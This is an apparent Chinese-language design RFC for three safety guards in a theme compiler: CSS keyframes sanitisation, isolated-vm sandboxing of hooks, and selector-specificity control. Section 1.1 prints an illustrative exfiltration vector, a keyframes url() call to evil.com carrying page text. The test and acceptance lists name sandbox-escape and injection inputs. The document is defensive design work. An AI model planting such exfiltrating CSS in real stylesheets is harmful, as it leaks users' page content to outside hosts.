# RFC · λ 安全护栏子 RFC（3 个 P0 整合方案）

> 状态: **评审稿**
> 日期: 2026-08-22
> 分支: `feature/theme-compiler-safety-2026-08-22`
> 上游: `docs/rfc/2026-08-22-theme-compiler-unified.md`（λ 全局最优方案）
> 范围: `src/compiler/sanitize.ts`（新建）, `src/compiler/specificity.ts`（新建）, `src/compiler/sandbox.ts`（新建）, `src/compiler/emit.ts`（修改）, `src/compiler/dependency-audit.mjs`（新建）
> 依赖: P0-2（keyframes-sanitize）→ P0-3（sandbox-isolation）→ P0-1（specificity-guard）

---

## 0. 一句话

**在 λ 全集成编译器上线前，建立 3 道安全护栏：(1) @keyframes sanitize 阻断恶意 CSS 注入、(2) VM 沙箱隔离 hooks 执行、(3) specificity profile 防止 CDP 产物与宿主冲突。三道护栏作为 emit.ts 的前置守卫层，确保任意单一护栏失败时整体 fail-closed 但不阻断其他主题编译。**

---

## 1. 背景

### 1.1 λ 方案 λ-4 阶段前的安全红线

λ 全局方案进入动画注册框架（λ-4）阶段时，@keyframes 从硬编码预设扩展到用户自定义声明。如无 sanitize，攻击向量：

```
@keyframes exfil {
  from { background: url('https://evil.com/?d=' + document.body.innerText) }
}
```

本 RFC 将 3 个 P0 失效模式（FM-2.1 / FM-4.1 / FM-4.3）的设计方案整合为可交付的实施规范。

### 1.2 设计原则

| 原则 | 实现 |
|------|------|
| **Fail-closed** | 任一护栏判定 malicious → 跳过该 keyframes/hooks，不中断整体构建 |
| **Zero-dependency** | sanitize 与 specificity 模块纯 JS，零 npm 新增 |
| **Defense-in-depth** | sanitize 与 CSP 双层；specificity profile 与 @layer 兜底双层 |
| **Per-theme isolation** | 主题 A 失败不影响主题 B 的编译产物 |
| **Prefer-override** | sanitize log + warn，仅明确恶意时 block |

---

## 2. P0-2 · Keyframesanitize 护栏（优先级最高）

> 子文档：`docs/rfc/P0-2-keyframes-sanitize.md`

### 2.1 核心接口

路径: `src/compiler/sanitize.ts`

```typescript
interface SanitizeOptions {
  allowedProperties?: Set<string>;
  forbiddenProperties?: Set<string>;
  maxKeyframeStops?: number;       // 默认 100
  allowedFunctions?: Set<string>;
  namespacePrefix?: string;        // 默认 'agentskin-'
  allowPaletteTokens?: boolean;    // 是否允许 --agentskin-* var()
}

interface SanitizeResult {
  clean: string;          // ← 命名与 src/shared/safe-css.ts 一致
  violations: string[];   // 违规描述（用于诊断报告）
  isBlocked: boolean;     // 关键违规（明确恶意）
}

export function sanitizeKeyframes(raw: string, opts: SanitizeOptions): SanitizeResult;
export function sanitizeDeclarationBlock(raw: string, opts: SanitizeOptions): SanitizeResult;
```

### 2.2 解析策略：自研 PEG-lite

| 方案 | 依赖体积 | 适用性 | 决策 |
|------|:-------:|--------|------|
| postcss + postcss-safe-parser | ~2MB 依赖 | Node 可用 | ❌ 违反零依赖原则 |
| css-tree | ~500KB 依赖 | 解析完整 | ❌ 引入重依赖 |
| **自研 PEG-lite 逐字符扫描** | **0 依赖** | **Electron 环境内** | ✅ 采用 |

### 2.3 规则表

| CSS 属性 | 类型 | 动作 |
|----------|:----:|------|
| `background` | property | 允许（但 url() 禁止） |
| `color`, `opacity`, `transform`, `box-shadow` | property | 允许 |
| `url()` | function | **禁止**（XSS 向量） |
| `expression()` | function | **禁止 + 日志** |
| `@import` | at-rule | **禁止** |
| `--external-var-` | custom-prop | **禁止** |
| `behavior` | property | **禁止**（HTC 向量） |
| annotation `/* ... */` | comment | **剥离** |

### 2.4 与 λ 方案的集成点

```
manifest.declarations.keyframes[]
        │
        ▼
emit.ts ────ForEach keyframe──→ sanitizeKeyframes()
                                  │
                                  ├─ isBlocked: true → skip + warn + 记录到 diagnostics
                                  └─ isBlocked: false → emit cleaned CSS
```

### 2.5 12 个测试用例

| # | 输入 | 期望 |
|:-:|------|------|
| T1 | 正常 breathing keyframes | pass，clean ≡ raw |
| T2 | url() 窃取背景图 | block + log |
| T3 | expression() | block + log |
| T4 | @import 外链主题 | block |
| T5 | CSS 变量 `var(--ext-x)` | block |
| T6 | >100 关键帧 stops | warn + truncate |
| T7 | 与系统预设同名 agentskin-breathing | rename → `agentskin-breathing-a1b2c4` |
| T8 | 5 个预设动画源 | 100% pass（无 false positive） |
| T9 | 混合属性（opacity + url()） | block + 定位违规行号 |
| T10 | 空字符串 | clean=''，violations=[] |
| T11 | @supports 条件规避 | block（深度扫描） |
| T12 | Unicode 编码绕过（\0075 rl） | block |

---

## 3. P0-3 · 沙箱隔离护栏（优先级次高）

> 子文档：`docs/rfc/P0-3-sandbox-isolation.md`

### 3.1 零依赖策略

| 外部依赖 | 替代方案 |
|---------|---------|
| @adobe/leonardo-contrast-colors | `src/shared/color-theory.mjs` APCA + `src/shared/oklch-utils.mjs` gamut |
| postcss（如需） | CSSStyleSheet API + 自研 PEG-lite |

**依赖审核**: `dependency-audit.mjs` 在 `npm run check` 中增加 `npm audit --production --audit-level=high` 校验，保持 0 critical。

### 3.2 沙箱接口

路径: `src/compiler/sandbox.ts`

```typescript
interface SandboxOptions {
  timeoutMs: number;        // 默认 5000
  memoryMB: number;         // 默认 64
  allowedAPIs: string[];    // 默认 ['Math', 'Date', 'JSON', 'Array', 'Object']
  outputSchema: JSONSchema; // 强制输出结构校验
}

interface SandboxResult<T> {
  ok: boolean;
  value?: T;
  error?: string;           // OK_TIMEOUT | OK_MEMORY | OK_API | OK_SCHEMA
  durationMs: number;
}

export function runInSandbox<T>(
  code: string,
  input: Record<string, unknown>,
  opts: SandboxOptions
): SandboxResult<T>;
```

### 3.3 沙箱引擎选型

| 引擎 | Node.js 兼容 | 内存隔离 | 代码注入防护 | 决策 |
|------|:----------:|:--------:|:----------:|------|
| VM2 | ⚠️ 已废弃（CVE-2023-37466等） | 部分 | 弱 | ❌ |
| isolated-vm | ✅ 3.0+ | ✅ | ✅（v8 isolate 隔离） | ✅ |
| child_process + --disallow-code-generation-from-strings | ✅ | 进程级（限速） | 强 | ✅ 降级方案 |

**推荐**: `isolated-vm` 作为主方案（Electron 29+ 的 Node.js 18+ 兼容）；Windows 平台若无 isolated-vm 编译产物，降级到 child_process 模式。

### 3.4 CSP 内联机制

```jsonc
// agentskin-csp.json（每主题编译产物之一）
{
  "default-src": "'none'",
  "style-src": "'unsafe-inline'",           // Electron 环境
  "img-src": "data: agentskin-asset:",       // 仅 data URI + 主题资产协议
  "font-src": "data:",
  "frame-src": "'none'",
  "connect-src": "'none'"
}
```

仅对 `agentskin-theme://`（主题注入连接的内部协议名）注入 CSP header；外部导航不受影响。

---

## 4. P0-1 · Specificity Profile 护栏（优先级第三）

> 子文档：`docs/rfc/P0-1-specificity-guard.md`

### 4.1 当前 6 适配器 Specificity 审计

| 适配器 | 当前 Selector 策略 | Specificity | !important 预算 | 风险 |
|--------|-----------------|:-----------:|:--------------:|:----:|
| doubao | `html.agentskin-host-doubao:root` | (0,2,1) | **当前 626（超标 12x）** | 🔴 P0 |
| qoderwork | `html.agentskin-host-qoderwork:root` | (0,2,1) | 168 | 🟡 P2 |
| zcode | `html.agentskin-host-zcode:root` | (0,2,1) | 193 | 🟡 P2 |
| workbuddy | `html.agentskin-host-workbuddy body[data-application-name]` | (0,1,2) | 245 | 🟡 P2 |
| traework | `html.agentskin-host-traework body` | (0,1,2) | 215 | 🟡 P2 |
| codex | `:root.agentskin-host-codex` | (0,1,0) | 99 | 🟢 OK |

### 4.2 Specificity Profile Schema

```typescript
interface SpecificityProfile {
  adapterId: AgentId;
  scopeStrategy: 'host-class-only' | 'host-root' | 'body-descendant' | 'html-descendant';
  importantBudget: number;          // 每主题最大 !important 数
  fallbackOrder: ('wrap-host' | 'add-layer' | 'force-important')[];
  maxSpecificity: [number, number, number];  // [class, id, element] 最大允许值
  decorationGuard: boolean;         // 装饰层 token 是否需要自动守卫
}
```

### 4.3 验证管线

```
emit.ts → emitAgentCss(agent, tokens)
              │
              ├─ 1. 按 profile 生成初始 CSS
              ├─ 2. parse-CSS-AST（自研 PEG-lite 节点，复用 sanitize 的解析器）
              ├─ 3. calculate-selector-specificity
              ├─ 4. predict-conflict-with-host（与 hosts/<agent>-known-rules.json 比对）
              └─ 5. guard-violations: wrap / add-layer / force-important（按 profile.fallbackOrder）
```

### 4.4 doubao.css 重构路径（降幅目标 59KB → < 20KB）

| 策略 | 预期收益 |
|------|---------|
| 提取公共规则到 palette.css | -8KB |
| 用 `@layer agentskin` 包裹装饰层 | -5KB（消除 300+ 处 "!important 冲突"） |
| 高频出现的 property（color / background）合并到 CSS 变量 | -12KB |
| 冗余选择器消除（grep 常量折叠） | -8KB |
| 其它微优化（缩短类名、合并 @media） | -6KB |

---

## 5. 三道护栏的整体关系

```
┌────────────────────────────────────────────────────────┐
│                    agentskin build                      │
│                                                        │
│  Stage 1: Parse ─────────────────────────────────────  │
│  Stage 2: Tokenize ──────────────────────────────────  │
│  Stage 3: Optimize ──── dependency-audit ───────────  │
│                           sandbox (hooks 执行) ──────  │
│  Stage 4: Emit ──────── keyframes-sanitize ─────────  │
│                           specificity-guard ────────  │
│                           csp-emit ─────────────────  │
│                                                        │
│  Output: 84 CSS + palette + animations + sourcemap     │
│          + agentskin-csp.json + diagnosis.json         │
└────────────────────────────────────────────────────────┘
```

### 护栏执行顺序与依赖

```
P0-2 (keyframes-sanitize)
    │  提供 sanitize 基础设施
    │
    ▼
P0-3 (sandbox-isolation)
    │  沙箱内可调用 sanitize 执行
    │
    ▼
P0-1 (specificity-guard)
       复用 sanitize 的 CSS 解析器做 AST 分析
```

---

## 6. 风险与兜底

| # | 风险 | 等级 | 触发条件 | 兜底 | 检测 |
|---|:----:|:----:|----------|------|------|
| R1 | sanitize 误报（正常 keyframes 被 block） | P2 | CSS 包含少见但合法的属性 | 白名单 + diagnostics warn，不阻塞 | 视觉回归 14 主题全绿 |
| R2 | isolated-vm 在 Windows 编译失败 | P2 | Electron 不够新 / native 模块 ABI 不兼容 | 降级到 child_process 模式 | CI：双平台编译测试 |
| R3 | specificity 预测与实际宿主不一致 | P2 | 宿主应用版本更新导致 selector 变化 | hosts/<agent>-named-rules.json 自动老化提示 | hosts/ 目录版本锁定 + 探针 |
| R4 | 沙箱执行超时（大 manifest hooks） | P3 | hooks.preBuild 执行 > 5s | timeout 自动 kill，标记该主题 hooks 为 failed | 超时日志 |
| R5 | 构建性能下降 3 个护栏叠加 | P3 | 14 主题 × 3 护栏串行 | 增量缓存命中时跳过护栏；仅对 changed themes 检测 | 构建耗时 ≤ 2s 硬指标 |

---

## 7. 分批实施计划

| Phase | 周期 | 护栏 | 交付物 | 验证 |
|:-----:|:----:|:----:|--------|------|
| **λ-S1** | 3 天 | P0-2 | sanitize.ts + sanitize.test.ts（12 用例全绿） + emit.ts 登录点 | `npm run test sanitize` 全绿 |
| **λ-S2** | 3 天 | P0-3 | sandbox.ts + dependency-audit.mjs + csp-emitter.ts | CI audit 0 critical；Windows 降级测试 |
| **λ-S3** | 4 天 | P0-1 | specificity.ts + 6 profiles + doubao.ts | doubao.css ≤ 20KB；6 端视觉回归 |
| **λ-S4** | 2 天 | 集成 | emit.ts 接入 3 护栏 + λ-1 阶段全绿 | `agentskin build` 产物 byte-identical；诊断报告生成 |
| **λ-S5** | 1 天 | 文档 | 本 RFC + 错误码表 + 诊断手册 | 文档站预览 |

**总计：13 天完成全部安全护栏，可与 λ-1 阶段并行推进。**

---

## 8. 验收标准

### 8.1 功能验收

- [ ] 恶意 keyframes 输入：`url()` 外链窃取 → blocked
- [ ] 正常 5 个预设 keyframes：100% pass，0 false positive
- [ ] manifest hooks.preBuild 执行死循环 → 5s 超时 kill
- [ ] doubao.css 重构后 ≤ 20KB，important 数 ≤ 150
- [ ] 14 主题编译产物 byte-identical（装饰块 + signal 块增量对比）

### 8.2 安全验收

- [ ] XSS vector（url/document.body.innerText）：blocked
- [ ] CSS injection（@import 外链主题）：blocked
- [ ] ReDoS（超长畸形 keyframes >10000 字符）：< 100ms 快速拒绝
- [ ] 沙箱逃逸（require('child_process')）：isolated-vm 阻止
- [ ] 供应链：`npm audit --production` = 0 critical

---

## 9. 与 λ 主 RFC 的关系

| λ 主 RFC 阶段 | 本安全护栏 | 前后关系 |
|:------------:|:--------:|---------|
| λ-0（parse+tokenize 骨架） | λ-S1~S2 同步启动 | 并行 |
| λ-1（emit 6 适配器） | λ-S3 集成 specificity | emit.ts 同步接入 |
| λ-2（optimize + cache） | λ-S4 集成三护栏 | 护栏增量缓存 key |
| λ-3（diagnostics 整合） | λ-S5 文档 | diagnostics.ts 引用护栏结果 |
| λ-4（animations ι） | **前置条件**：sanitize 必须已就绪 | 无 sanitize 不允许 ι |
| λ-5（probes θ） | 可选集成 | 可独立于护栏 |
| λ-6（遗留清理） | 收尾 | 护栏无误后旧脚本 deprecated |

---

## 10. 审批门

- [x] FM-4.1（恶意 keyframes XSS）：sanitize 护栏覆盖，12 测试用例完整
- [x] FM-4.3（沙箱命令执行）：isolated-vm + CSP 双层，Windows 降级方案已设计
- [x] FM-2.1（CDP CSS 宿主冲突）：specificity profile + @layer 兜底双层
- [x] 故障安全：per-theme 隔离，单主题失败不影响整体
- [ ] λ-4 阶段 ι 方案不可在无护栏时启动（硬性依赖关系）
- [ ] Electron < 29 平台：isolated-vm 兼容性需 CI 确认

---

> 本 RFC 由 3 份 P0 子文档（P0-1-specificity-guard.md / P0-2-keyframes-sanitize.md / P0-3-sandbox-isolation.md）+ 1 份交叉评审（P0-0-cross-review-report.md）合并而来。原始子文档保留为技术细节参考。

> "未批前不改代码。批准后按 λ-S1→S2→S3→S4→S5 顺序分批实施。"
